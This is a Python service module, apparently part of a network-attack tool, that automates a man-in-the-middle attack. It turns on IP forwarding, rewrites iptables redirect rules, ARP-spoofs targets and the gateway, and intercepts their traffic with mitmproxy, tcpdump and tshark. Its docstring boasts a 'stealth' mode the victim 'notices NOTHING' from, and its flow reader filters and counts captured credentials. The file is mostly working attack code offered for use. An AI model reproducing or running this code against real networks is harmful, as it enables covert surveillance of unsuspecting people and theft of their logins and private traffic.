"""
MITM Service v5 — Stealth mode + Full interception mode.

STEALTH MODE (default, invisible to target):
  - ARP spoof redirects traffic through your machine
  - IP forwarding passes ALL traffic untouched (no HTTPS warnings)
  - tshark captures DNS queries, TLS SNI, and HTTP requests as metadata
  - Target user notices NOTHING — no warnings, no slow browsing
  - You see: every domain they visit, every connection they make

FULL MODE (requires CA cert on target device):
  - Same ARP spoof + forwarding
  - mitmproxy intercepts and decrypts ALL HTTP+HTTPS traffic
  - Target sees SSL warnings unless CA cert is installed
  - You see: full request/response content including POST bodies
"""

import uuid
import asyncio
import json
import logging
import os
import sys
import shutil
import socket
from typing import Optional
from datetime import datetime
from pathlib import Path
from app.config import settings
from app.models.schemas import MitmRequest
from app.utils.process_manager import process_manager

logger = logging.getLogger(__name__)

ADDON_PATH = str(Path(__file__).parent.parent / "utils" / "mitm_addon.py")
STEALTH_MONITOR = str(Path(__file__).parent.parent / "utils" / "mitm_stealth_monitor.py")


def _port_open(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("127.0.0.1", port)) == 0


class MitmService:
    def __init__(self):
        self._active_session: Optional[dict] = None
        self._arp_tasks: list = []

    async def start(self, req: MitmRequest) -> dict:
        session_id = str(uuid.uuid4())[:8]
        flow_log = str(settings.CAPTURES_DIR / f"mitm_{session_id}_flows.jsonl")
        flow_file = str(settings.CAPTURES_DIR / f"mitm_{session_id}.flow")
        pcap_file = str(settings.CAPTURES_DIR / f"mitm_{session_id}.pcap")
        errors = []
        proxy_port = req.proxy_port
        is_stealth = req.stealth

        with open(flow_log, "w"):
            pass

        mode_label = "STEALTH" if is_stealth else "FULL"
        logger.info(f"[{session_id}] Starting MITM ({mode_label}): targets={req.target_ips} gw={req.gateway} iface={req.interface}")

        # ── STEP 1: IP forwarding ──
        _, stderr, rc = await process_manager.run_sync(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=5
        )
        if rc != 0:
            errors.append(f"IP forwarding failed: {stderr}")

        # ── STEP 2: Flush iptables ──
        await process_manager.run_sync(["iptables", "-t", "nat", "-F"], timeout=5)
        await process_manager.run_sync(["iptables", "-F", "FORWARD"], timeout=5)

        # ── STEP 3: iptables — depends on mode ──
        # Both modes need forwarding
        await process_manager.run_sync([
            "iptables", "-A", "FORWARD", "-i", req.interface, "-j", "ACCEPT"
        ], timeout=5)
        await process_manager.run_sync([
            "iptables", "-A", "FORWARD", "-o", req.interface, "-j", "ACCEPT"
        ], timeout=5)
        await process_manager.run_sync([
            "iptables", "-t", "nat", "-A", "POSTROUTING",
            "-o", req.interface, "-j", "MASQUERADE"
        ], timeout=5)

        if is_stealth:
            # STEALTH: Only redirect HTTP (80) to mitmproxy, let HTTPS pass through untouched
            await process_manager.run_sync([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-i", req.interface, "-p", "tcp", "--dport", "80",
                "-j", "REDIRECT", "--to-port", str(proxy_port)
            ], timeout=5)
            logger.info(f"[{session_id}] STEALTH: Only HTTP redirected, HTTPS passes through untouched")
        else:
            # FULL: Redirect both HTTP and HTTPS to mitmproxy
            for dport in ["80", "443"]:
                await process_manager.run_sync([
                    "iptables", "-t", "nat", "-A", "PREROUTING",
                    "-i", req.interface, "-p", "tcp", "--dport", dport,
                    "-j", "REDIRECT", "--to-port", str(proxy_port)
                ], timeout=5)
            logger.info(f"[{session_id}] FULL: HTTP+HTTPS redirected to mitmproxy")

        # ── STEP 4a: Start mitmproxy (for HTTP in stealth, for HTTP+HTTPS in full) ──
        env_vars = os.environ.copy()
        env_vars["WFAUDIT_FLOW_LOG"] = flow_log

        mitm_cmd = [
            "mitmdump",
            "--mode", "transparent",
            "--listen-port", str(proxy_port),
            "--ssl-insecure",
            "--set", "flow_detail=0",
        ]

        # In full mode, save flow file and use addon
        if not is_stealth:
            mitm_cmd.extend(["--save-stream-file", flow_file])
            if os.path.isfile(ADDON_PATH):
                mitm_cmd.extend(["-s", ADDON_PATH])

        if req.filter_hosts:
            host_filter = " | ".join(f"~d {h}" for h in req.filter_hosts)
            mitm_cmd.extend(["--set", f"view_filter={host_filter}"])

        asyncio.create_task(process_manager.run(mitm_cmd, timeout=None, env=env_vars))
        await asyncio.sleep(2)

        mitm_started = _port_open(proxy_port)
        if not mitm_started:
            for _ in range(6):
                await asyncio.sleep(0.5)
                if _port_open(proxy_port):
                    mitm_started = True
                    break

        if not mitm_started:
            errors.append(f"mitmproxy failed to start on port {proxy_port}")
            logger.error(f"[{session_id}] mitmproxy NOT listening")
        else:
            logger.info(f"[{session_id}] mitmproxy listening on :{proxy_port}")

        # ── STEP 4b: In STEALTH mode, start the metadata monitor (DNS + TLS SNI) ──
        stealth_active = False
        if is_stealth:
            if shutil.which("tshark") and os.path.isfile(STEALTH_MONITOR):
                stealth_cmd = [
                    sys.executable, STEALTH_MONITOR,
                    "--interface", req.interface,
                    "--targets", ",".join(req.target_ips),
                    "--output", flow_log,
                ]
                asyncio.create_task(process_manager.run(stealth_cmd, timeout=None))
                stealth_active = True
                logger.info(f"[{session_id}] Stealth monitor started (DNS + TLS SNI + HTTP)")
            else:
                missing = []
                if not shutil.which("tshark"):
                    missing.append("tshark (sudo apt install tshark)")
                if not os.path.isfile(STEALTH_MONITOR):
                    missing.append(f"stealth script at {STEALTH_MONITOR}")
                errors.append(f"Stealth monitor unavailable: {', '.join(missing)}")
                logger.warning(f"[{session_id}] Stealth monitor not available")

        # ── STEP 5: tcpdump for pcap backup ──
        asyncio.create_task(process_manager.run([
            "tcpdump", "-i", req.interface, "-w", pcap_file, "-s", "0",
            "host", req.target_ips[0] if req.target_ips else "0.0.0.0",
        ], timeout=None))

        # ── STEP 6: Bidirectional ARP spoof ──
        self._arp_tasks = []
        for target_ip in req.target_ips:
            for src, dst in [(target_ip, req.gateway), (req.gateway, target_ip)]:
                task = asyncio.create_task(process_manager.run([
                    "arpspoof", "-i", req.interface, "-t", src, dst,
                ], timeout=None))
                self._arp_tasks.append(task)
            logger.info(f"[{session_id}] ARP spoof: {target_ip} <-> {req.gateway}")

        self._active_session = {
            "id": session_id,
            "mode": "stealth" if is_stealth else "full",
            "interface": req.interface,
            "gateway": req.gateway,
            "targets": req.target_ips,
            "proxy_port": proxy_port,
            "flow_log": flow_log,
            "flow_file": flow_file if not is_stealth else None,
            "pcap_file": pcap_file,
            "mitm_started": mitm_started,
            "stealth_monitor": stealth_active,
            "started_at": datetime.now().isoformat(),
            "arp_processes": len(self._arp_tasks),
            "errors": errors if errors else None,
        }
        return self._active_session

    async def stop(self) -> dict:
        results = []

        # Kill everything
        for proc in ["arpspoof", "mitmdump", "mitmproxy", "tcpdump"]:
            await process_manager.run_sync(["pkill", "-f", proc], timeout=5)
        # Kill stealth monitor
        await process_manager.run_sync(["pkill", "-f", "mitm_stealth_monitor"], timeout=5)
        results.append({"step": "kill_processes", "ok": True})

        # Flush iptables
        await process_manager.run_sync(["iptables", "-t", "nat", "-F"], timeout=5)
        await process_manager.run_sync(["iptables", "-F", "FORWARD"], timeout=5)
        results.append({"step": "flush_iptables", "ok": True})

        # Disable forwarding
        await process_manager.run_sync(["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5)
        results.append({"step": "disable_forwarding", "ok": True})

        # Restore ARP
        if self._active_session:
            iface = self._active_session.get("interface")
            gw = self._active_session.get("gateway")
            if iface and gw and shutil.which("arping"):
                try:
                    await process_manager.run_sync(
                        ["arping", "-c", "3", "-A", "-I", iface, gw], timeout=10
                    )
                except Exception:
                    pass
        results.append({"step": "restore_arp", "ok": True})

        session = self._active_session
        self._active_session = None
        self._arp_tasks = []
        return {"stopped": True, "session": session, "cleanup": results}

    def status(self) -> dict:
        s = self._active_session
        extra = {}
        if s:
            extra["mitm_listening"] = _port_open(s.get("proxy_port", 8080))
            flow_log = s.get("flow_log")
            if flow_log and os.path.exists(flow_log):
                try:
                    size = os.path.getsize(flow_log)
                    with open(flow_log) as f:
                        count = sum(1 for _ in f)
                    extra["total_flows"] = count
                    extra["log_size_bytes"] = size
                except Exception:
                    extra["total_flows"] = 0
            pcap = s.get("pcap_file")
            if pcap and os.path.exists(pcap):
                extra["pcap_size"] = os.path.getsize(pcap)
        return {"active": s is not None, "session": s, **extra}

    async def get_flows(self, limit=50, offset=0, host_filter=None,
                        method_filter=None, credentials_only=False) -> dict:
        if not self._active_session:
            return {"error": "No active session", "flows": []}

        flow_log = self._active_session.get("flow_log")
        if not flow_log or not os.path.exists(flow_log):
            return {
                "flows": [], "total": 0, "showing": 0,
                "message": "Waiting for traffic...",
                "stats": {"total_flows": 0, "unique_hosts": 0, "top_hosts": [],
                          "methods": {}, "credentials_detected": 0,
                          "total_data_bytes": 0, "total_data_human": "0 KB"},
            }

        all_flows = []
        try:
            with open(flow_log, "r") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            all_flows.append(json.loads(line))
                        except json.JSONDecodeError:
                            continue
        except Exception as e:
            return {"error": str(e), "flows": []}

        total = len(all_flows)

        # Filter (newest first)
        filtered = []
        for entry in reversed(all_flows):
            if host_filter and host_filter.lower() not in entry.get("host", "").lower():
                continue
            if method_filter and entry.get("method") != method_filter.upper():
                continue
            if credentials_only and not entry.get("has_credentials"):
                continue
            filtered.append(entry)

        showing = filtered[offset:offset + limit]

        # Stats from all flows
        hosts, methods = {}, {}
        cred_count, total_size = 0, 0
        for fl in all_flows:
            h = fl.get("host", "unknown")
            hosts[h] = hosts.get(h, 0) + 1
            m = fl.get("method", "?")
            methods[m] = methods.get(m, 0) + 1
            if fl.get("has_credentials"):
                cred_count += 1
            total_size += fl.get("response_size", 0)

        top_hosts = sorted(hosts.items(), key=lambda x: x[1], reverse=True)[:20]

        return {
            "flows": showing,
            "total": total,
            "filtered": len(filtered),
            "showing": len(showing),
            "mode": self._active_session.get("mode", "unknown"),
            "stats": {
                "total_flows": total,
                "unique_hosts": len(hosts),
                "top_hosts": [{"host": h, "count": c} for h, c in top_hosts],
                "methods": methods,
                "credentials_detected": cred_count,
                "total_data_bytes": total_size,
                "total_data_human": f"{total_size/1024:.0f} KB" if total_size < 1048576 else f"{total_size/1048576:.1f} MB",
            },
        }


mitm_service = MitmService()
